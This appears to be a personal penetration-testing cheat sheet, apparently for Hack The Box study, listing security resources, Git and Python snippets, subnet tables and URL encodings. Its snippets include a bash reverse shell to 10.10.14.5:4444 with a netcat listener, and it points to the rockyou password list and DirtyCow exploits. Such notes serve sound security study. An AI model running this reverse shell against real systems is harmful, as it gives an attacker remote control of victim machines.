Reminder: Github uses advanced search syntax - press `t`. Or clone locally and grep

`cp /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt .`

# RESOURCES
OWASP Projects
- [OWASP Web Security Testing Guide (WSTG)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/)
- [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/index.html)
     [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/stable-en/)

HackTricks
- [HackTricks](https://book.hacktricks.wiki/en/index.html)
- [HackTricks Cloud](https://cloud.hacktricks.wiki/en/index.html)

PrivEsc
- [GTFOBins](https://gtfobins.github.io/)
- [Linux PE Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)
- [Windows PE Checkist](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)
- https://infosecwriteups.com/hackthebox-academy-privilege-escalation-ca0a8ad2259e

Git
- [GitHub CheatSheet](https://training.github.com/downloads/github-git-cheat-sheet/)

Enumeration
- [Server Enum](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

Kernel
- [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

Kindle Books

HTB
- https://academy.hackthebox.com/dashboard
 
# COMMON CODE SNIPPETS
### Git
```
git clone https://github.com/Jacob-CL/Notes.git
git commit -m "message"
git push
git pull (To merge GitHub repo with local)
```
### Files
```
Open in VS Code: code filename.md
Make a file: touch filename.md
```

### Python Virtual Environment
```
-- LINUX:
python3 -m venv v-env
source v-env/bin/activate
deactivate

-- WINDOWS:
py -3.11 -m venv myenv                      # Make
myenv\Scripts\activate                      # Activate
python --version  # Verify it's 3.11.x      # Check version
python.exe -m pip install --upgrade pip     # Upgrade pip
```
### Bash Reverse Shell
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
### Python HTTP Server
```
# Serves files from current directory, also accessible vias browser
python3 -m http.server 8000
```
### Netcat Listener
```
nc -lvnp 4444
```
### Find all files recursively
```
find . -type f
```

---

# NETWORKING
## IPv4
### Classful IPv4 Ranges
| Description | Classful IPv4 Ranges |
|--------------------------------------------------|----------------------------------|
| Class A Range | 0.0.0.0   – 127.255.255.255 |
| Class B Range | 128.0.0.0 – 191.255.255.255 |
| Class C Range | 192.0.0.0 – 223.255.255.255 |
| Class D Range | 224.0.0.0 – 239.255.255.255 |
| Class E Range | 240.0.0.0 – 255.255.255.255 |

---

### Reserved Private Ranges
| Description | Reserved Private Ranges |
|--------------------------------------------------|----------------------------------|
| Class A Range | 10.0.0.0    – 10.255.255.255 |
| Class B Range | 172.16.0.0  – 172.31.255.255 |
| Class C Range | 192.168.0.0 - 192.168.255.255 |
| Loopback Range | 127.0.0.0   – 127.255.255.255 |

---

### Subnetting
| Useable Hosts | Subnet Mask | CIDR |
|-------------|-------------------|-----------|
| 0 Useable Hosts | 255.255.255.254 | /31 |
| 2 Hosts | 255.255.255.252 | /30 |
| 6 Hosts | 255.255.255.248 | /29 |
| 14 Hosts | 255.255.255.240 | /28 |
| 30 Hosts | 255.255.255.224 | /27 |
| 62 Hosts | 255.255.255.192 | /26 |
| 126 Hosts | 255.255.255.128 | /25 |
| 254 Hosts | 255.255.255.0 | /24 |
| 510 Hosts | 255.255.254.0 | /23 |
| 1022 Hosts | 255.255.252.0 | /22 |
| 2046 Hosts | 255.255.248.0 | /21 |
| 4094 Hosts | 255.255.240.0 | /20 |
| 8190 Hosts | 255.255.224.0 | /19 |

---

## IPv6
### IPv6 Broadcast Addresses
| Description | Broadcast Addresses |
|--------------------------------------------------|----------------------------------|
| link-local nodes | ff02::1 |
| node-local routers | ff01::2 |
| link-local routers | ff02::2 |
| site-local routers | ff05::2 |

---

### IPv6 Interface Addresses
| Description | Interface Addresses |
|--------------------------------------------------|----------------------------------|
| link-local | fe80:: |
| routable | 2001:: |
| IPv4 compatible IPv6 (Example: ::192.168.1.2) | ::a.b.c.d |
| IPv4 mapped IPv6 (Example: ::FFFF:129.144.52.38) | ::ffff:a.b.c.d |
| Global Unicast | 2000::/3 |
| Unique Local | FC00::/7 |

---

# CONVERSIONS
## URL Encoding
| **Character** | URL Encoded | **Character** | URL Encoded | **Character** | URL Encoded |
|-----------|------------|-----------|------------|-----------|------------|
| a | %61 | A | %41 | 0 | %30 |
| b | %62 | B | %42 | 1 | %31 |
| c | %63 | C | %43 | 2 | %32 |
| d | %64 | D | %44 | 3 | %33 |
| e | %65 | E | %45 | 4 | %34 |
| f | %66 | F | %46 | 5 | %35 |
| g | %67 | G | %47 | 6 | %36 |
| h | %68 | H | %48 | 7 | %37 |
| i | %69 | I | %49 | 8 | %38 |
| j | %6A | J | %4A | 9 | %39 |
| k | %6B | K | %4B | space | %20 |
| l | %6C | L | %4C | ! | %21 |
| m | %6D | M | %4D | " | %22 |
| n | %6E | N | %4E | # | %23 |
| o | %6F | O | %4F | $ | %24 |
| p | %70 | P | %50 | % | %25 |
| q | %71 | Q | %51 | & | %26 |
| r | %72 | R | %52 | ' | %27 |
| s | %73 | S | %53 | ( | %28 |
| t | %74 | T | %54 | ) | %29 |
| u | %75 | U | %55 | * | %2A |
| v | %76 | V | %56 | + | %2B |
| w | %77 | W | %57 | , | %2C |
| x | %78 | X | %58 | - | %2D |
| y | %79 | Y | %59 | . | %2E |
| z | %7A | Z | %5A | / | %2F |
| : | %3A | ; | %3B | < | %3C |
| = | %3D | > | %3E | ? | %3F |
| @ | %40 | [ | %5B | \ | %5C |
| ] | %5D | ^ | %5E | _ | %5F |
| ` | %60 | { | %7B | \| | %7C |
| } | %7D | ~ | %7E | & | %26 |
| = | %3D | + | %2B | $ | %24 |
| , | %2C | / | %2F | : | %3A |
| ; | %3B | @ | %40 | ? | %3F |
| # | %23 | % | %25 | \\ | %5C |
| -  | %2D | _ | %5F | . | %2E |

